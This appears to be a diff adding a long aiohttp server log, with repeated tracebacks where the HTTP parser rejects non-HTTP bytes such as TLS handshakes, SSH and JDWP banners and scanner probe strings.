+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x05\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x05\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'SSH-2.0-Go'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x05\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'JDWP-Handshake'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\xff'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\xff'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\xff'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
